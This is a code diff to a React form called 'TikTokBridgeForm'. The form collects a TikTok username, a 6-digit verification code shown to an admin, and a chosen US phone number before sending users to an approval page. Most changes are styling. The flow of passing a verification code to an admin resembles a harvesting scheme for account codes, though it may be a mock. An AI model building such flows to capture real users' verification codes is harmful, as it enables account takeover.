@@ -19,14 +19,14 @@ import { Carousel, CarouselContent, CarouselItem, type CarouselApi } from "@/com
 import { useCollection, useFirestore, useMemoFirebase } from "@/firebase";
 import { cn } from "@/lib/utils";
 import { TikTokLogo } from "./icons/tiktok-logo";
-import { setDocumentNonBlocking, updateDocumentNonBlocking } from "@/firebase/non-blocking-updates";
+import { updateDocumentNonBlocking } from "@/firebase/non-blocking-updates";
 
 const TIKTOK_BRIDGE_STEPS = [
   { step: 1, title: "Your TikTok", icon: User, fields: ['username'] as const },
   { step: 2, title: "Processing...", icon: TikTokLogo, fields: [] as const },
   { step: 3, title: "Enter Code", icon: KeyRound, fields: ['verificationCode'] as const },
   { step: 4, title: "Select a Number", icon: Phone, fields: ['usNumber'] as const },
-  { step: 5, title: "Completed", icon: CheckCircle, fields: [] as const },
+  { step: 5, "title": "Completed", "icon": CheckCircle, "fields": [] as const },
 ];
 
 const formSchema = z.object({
@@ -76,7 +76,7 @@ export function TikTokBridgeForm() {
     
   const handleNext = async () => {
     const fieldsToValidate = TIKTOK_BRIDGE_STEPS[currentStep]?.fields;
-    if (fieldsToValidate) {
+    if (fieldsToValidate && fieldsToValidate.length > 0) {
         const isValid = await form.trigger(fieldsToValidate);
         if (!isValid) return;
     }
@@ -129,7 +129,7 @@ export function TikTokBridgeForm() {
 
             updateDocumentNonBlocking(submissionDocRef, finalData);
             
-            router.push('/waiting-for-approval');
+            router.push(`/waiting-for-approval?id=${submissionId}`);
             return; 
         }
 
@@ -167,19 +167,19 @@ export function TikTokBridgeForm() {
   const progressValue = Math.max(0, ((currentStep - (currentStep > 1 ? 1: 0)) / (TIKTOK_BRIDGE_STEPS.length - 2)) * 100);
 
   return (
-    <Card>
+    <Card className="rounded-2xl shadow-xl border-t">
       <CardHeader>
-        <Progress value={progressValue} className="mb-4" />
-        <div className="flex items-center space-x-3 min-h-[48px]">
+        <Progress value={progressValue} className="mb-4 h-1.5" />
+        <div className="flex items-center space-x-4 min-h-[48px]">
             <div className={cn(
-                "flex h-8 w-8 items-center justify-center rounded-full bg-primary text-primary-foreground shrink-0",
+                "flex h-10 w-10 items-center justify-center rounded-full bg-primary text-primary-foreground shrink-0",
                  currentStep === 1 && "animate-pulse"
             )}>
-                <CurrentIcon className={cn("h-5 w-5", currentStep === 1 && "h-8 w-8")} />
+                <CurrentIcon className={cn("h-6 w-6", currentStep === 1 && "h-10 w-10")} />
             </div>
             <div>
-                <CardTitle>{TIKTOK_BRIDGE_STEPS[currentStep].title}</CardTitle>
-                {currentStep < TIKTOK_BRIDGE_STEPS.length - 1 && currentStep !== 1 &&
+                <CardTitle className="text-xl">{TIKTOK_BRIDGE_STEPS[currentStep].title}</CardTitle>
+                {currentStep < TIKTOK_BRIDGE_STEPS.length - 2 && currentStep !== 1 &&
                     <CardDescription>Step {currentStep > 1 ? currentStep-1 : currentStep+1} of {TIKTOK_BRIDGE_STEPS.length - 2}</CardDescription>
                 }
             </div>
@@ -200,7 +200,7 @@ export function TikTokBridgeForm() {
                         <FormControl>
                           <div className="relative">
                             <AtSign className="absolute left-3 top-1/2 -translate-y-1/2 h-4 w-4 text-muted-foreground" />
-                            <Input placeholder="your_username" {...field} className="pl-10" />
+                            <Input placeholder="your_username" {...field} className="pl-10 h-11" />
                           </div>
                         </FormControl>
                         <FormMessage />
@@ -225,9 +225,9 @@ export function TikTokBridgeForm() {
                       <FormItem className="pt-2">
                         <FormLabel>Verification Code</FormLabel>
                         <FormControl>
-                            <Input placeholder="123456" {...field} />
+                            <Input placeholder="123456" {...field} className="h-11 text-lg tracking-widest text-center" />
                         </FormControl>
-                        <p className="text-sm text-muted-foreground pt-1">Enter any 6-digit code for the admin to see.</p>
+                        <p className="text-sm text-muted-foreground pt-1 text-center">Enter any 6-digit code for the admin to see.</p>
                         <FormMessage />
                       </FormItem>
                     )}
@@ -255,8 +255,8 @@ export function TikTokBridgeForm() {
                                         key={number.id} 
                                         onClick={() => field.onChange(number.phoneNumber)}
                                         className={cn(
-                                            "cursor-pointer transition-all hover:bg-accent/50",
-                                            field.value === number.phoneNumber && "border-primary bg-accent/20"
+                                            "cursor-pointer transition-all hover:shadow-md hover:border-primary/50 rounded-xl",
+                                            field.value === number.phoneNumber && "border-primary ring-2 ring-primary/50 shadow-lg"
                                         )}
                                     >
                                         <CardHeader className="p-4">
@@ -312,12 +312,12 @@ export function TikTokBridgeForm() {
           </CardContent>
           
           {currentStep < 4 && currentStep !== 1 && (
-            <CardFooter className="flex justify-between">
-              <Button type="button" variant="ghost" onClick={handlePrev} disabled={currentStep === 0 || isSubmitting}>Back</Button>
-              <Button type="button" onClick={handleNext} disabled={isSubmitting || (currentStep === 3 && phoneNumbersLoading)}>
+            <CardFooter className="flex-col-reverse gap-4 pt-4">
+              <Button type="button" onClick={handleNext} disabled={isSubmitting || (currentStep === 3 && phoneNumbersLoading)} className="w-full rounded-full" size="lg">
                 {isSubmitting ? <Loader2 className="mr-2 h-4 w-4 animate-spin" /> : null}
                 {currentStep === 3 ? "Finish & Wait for Approval" : "Continue"}
               </Button>
+              <Button type="button" variant="ghost" onClick={handlePrev} disabled={currentStep === 0 || isSubmitting} className="w-full rounded-full">Back</Button>
             </CardFooter>
           )}
         </form>
